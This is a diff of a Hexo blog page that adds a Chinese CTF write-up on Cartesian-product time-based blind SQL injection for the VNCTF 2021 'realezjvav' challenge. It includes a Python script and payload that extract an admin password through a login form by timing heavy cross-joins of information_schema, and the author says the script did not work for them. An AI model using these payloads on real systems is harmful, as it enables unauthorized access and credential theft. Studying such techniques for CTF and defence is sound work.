@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>tags - 笔记 - Hexo</title>
+<title>sql注入之笛卡尔积注入 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -114,17 +114,17 @@
 
             <div class="page-title">
     <ul>
-        <li class="">
-            <a href="/" data-name="Recent Posts">Recent Posts</a>
-        </li>
+        <li><a href="/">Recent Posts</a></li>
         
-        <li class="">
-            <a href="/categories/tech-notes" data-name="技术">技术</a>
-        </li>
-        
-        <li class="">
-            <a href="/categories/huma" data-name="人文">人文</a>
-        </li>
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
         
         <li class="page-search">
     <form id="search" class="search-form">
@@ -139,212 +139,102 @@
     </ul>
 </div>
 <div class="main-inner">
-    
-        
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-03-17">2021-03-17</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">sql注入之笛卡尔积注入</h2>
+            <div class="post-meta">
+                emm... 1769 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>这次参加了一个vnctf，结果被爆杀了，后来才知道这个比赛是我目前达不到的境界，但是参加这次比赛还是有收获的，比如知道了这样一种新的sql注入方法——笛卡尔积注入。  </p>
+<h1 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a>笛卡尔积注入</h1><p>其实笛卡尔积注入也是时间注入的一种方式，当我们发现sleep()函数被禁用过滤掉之后，就可以使用笛卡尔积注入来达到另一种延时注入的效果。  </p>
+<p>下面介绍一下笛卡尔积注入的原理<br><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/60562130524f85ce29016301.jpg"><img src="https://img.imgdb.cn/item/60562130524f85ce29016301.jpg"></a>  </p>
+<p>笛卡尔积也就是两个集合相乘的运算，而数据库中表与表之间就正好可以做笛卡尔积的运算，而我们通过进行笛卡尔积运算来增加运算负荷延迟，这样做执行时间会几何倍数的提升，在表比较大的情况下会造成几何倍数的效果，导致延时时间无法控制。  </p>
+<p>也就是说我们通过增大运算量来让sql查询的执行时间延长，从而达到延时注入的效果，比如构造如下语句。  </p>
+<pre><code>mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C; </code></pre>
+<p>这样就会使时间延长，通过脚本我们就可以进行sql注入，下面附上这次比赛的注入题。  </p>
+<h1 id="VNCTF-2021-realezjvav"><a href="#VNCTF-2021-realezjvav" class="headerlink" title="[VNCTF 2021]realezjvav"></a>[VNCTF 2021]realezjvav</h1><p>可以看到这道题要求我们输入正确的用户和密码，通过fuzz测试发现sleep()函数被过滤，所以我们采用笛卡尔积注入。  </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/605623c3524f85ce2902b3b8.png"><img src="https://img.imgdb.cn/item/605623c3524f85ce2902b3b8.png"></a></p>
+<p>下面附上脚本：  </p>
+<pre><code>import requests
+import time
+url = &quot;http://192.168.0.104:8080/user/login&quot;
+i = 0
+flag = &quot;&quot;
+while True :
+i += 1
+head = 32
+tail = 126
+while head &lt; tail :
+    mid = head + tail &gt;&gt; 1
+    payload = &quot;a&#39; or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#&quot; % (i,mid)
+    data = &#123;&quot;username&quot;:&quot;admin&quot; , &quot;password&quot; : payload&#125;   
+    start_time = time.time()
+    r = requests.post(url,data = data)
+    print(data[&#39;password&#39;])
+    end_time = time.time()
+    if end_time - start_time &gt; 3:
+        head = mid + 1
+    else :
+        tail = mid
+if head!=32:
+    flag += chr(head)
+    print(flag)
+else :
+    break  </code></pre>
+<p>这道题的笛卡尔积注入就是下面的代码，通过测试，发现当进行三个表的笛卡尔积运算时延时大约为6秒，通过对延时的判断可以得到密码。 </p>
+<pre><code>payload = &quot;a&#39; or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#&quot; % (i,mid)  </code></pre>
+<p>实际跑这个脚本其实没跑出来，不知哪里出了问题。。。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题给我最大的收获也就是这个注入方式了，因为后面的都看不懂。。。。。。还是要努力。  </p>
+
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
             </a>
-            <em>·</em>2021-03-17
-            
         </div>
-        <a class="post-title" href="/note6/undefined-undefined.html" target="_blank" title="sql注入之笛卡尔积注入">sql注入之笛卡尔积注入</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        sql注入之笛卡尔积注入
-    </div>
-</article>
-
-
-
         
+        <div class="post-tags">Tags：
             
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2021-02-09
+            <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
             
         </div>
-        <a class="post-title" href="/note5/undefined-undefined.html" target="_blank" title="关于报错注入concat函数的替换">关于报错注入concat函数的替换</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        关于报错注入concat函数的替换
-    </div>
-</article>
-
-
-
         
-            
-<article class="post">
+    </article>
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2021-01-28
-            
-        </div>
-        <a class="post-title" href="/note4/undefined-undefined.html" target="_blank" title="sql绕过方法笔记">sql绕过方法笔记</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        sql绕过方法笔记
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2021-01-18
-            
-        </div>
-        <a class="post-title" href="/note3/undefined-undefined.html" target="_blank" title="万能密码总结">万能密码总结</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        万能密码总结
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-12-02
-            
-        </div>
-        <a class="post-title" href="/note2/undefined-undefined.html" target="_blank" title="PHP伪协议笔记">PHP伪协议笔记</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        PHP伪协议笔记
-    </div>
-</article>
-
-
-
-        
-            
-<article class="post">
     
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-29
-            
-        </div>
-        <a class="post-title" href="/note1/undefined-undefined.html" target="_blank" title="PHP中foreach函数笔记">PHP中foreach函数笔记</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        PHP中foreach函数笔记
-    </div>
-</article>
 
-
-
-        
-            
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://george186.github.io" target="_blank">
-                <strong>george</strong>
-            </a>
-            <em>·</em>2020-11-28
-            
-        </div>
-        <a class="post-title" href="/note/undefined-undefined.html" target="_blank" title="第一周学习报告">第一周学习报告</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://george186.github.io/tags/%E7%AC%94%E8%AE%B0/" target="_blank">笔记</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        第一周学习报告
-    </div>
-</article>
-
-
-
-        
-    
 </div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
 
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
